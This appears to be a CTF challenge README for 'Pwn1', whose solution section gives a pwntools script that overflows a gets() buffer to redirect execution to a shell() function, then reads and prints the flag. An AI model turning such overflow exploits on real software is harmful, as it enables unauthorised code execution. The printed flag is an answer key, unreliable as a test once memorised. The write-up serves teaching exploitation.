# Pwn1
### 📄 Description
Can you retrieve the flag?

### ⚙ How to run it
```bash
./pwn1
```

### ⛔ Rules
Don't open the `flag.txt` file.

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>

We have to overflow the buffer named buffer and overwrite `main()` return address to point to the `shell()` function entry point in order to pop a shell. `gets()` is used for the input. Remembrer that `gets` doesn't check the buffer bounds.

```python
from pwn import *

context.binary = "./pwn1"

p = process()
p.sendline(b"A" * 128 + b"a" * 12 + p32(context.binary.functions["shell"].address))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

<h3> 🚩 Flag </h3>

```plain
encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
```
</details>